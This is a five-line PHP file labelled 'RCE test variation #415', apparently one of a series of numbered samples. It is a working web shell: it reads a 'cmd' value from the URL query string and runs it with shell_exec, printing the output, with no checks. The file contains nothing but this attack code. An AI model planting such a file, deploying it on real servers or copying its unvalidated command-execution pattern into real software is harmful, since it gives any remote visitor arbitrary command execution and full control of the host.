<?php
// RCE test variation #415
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>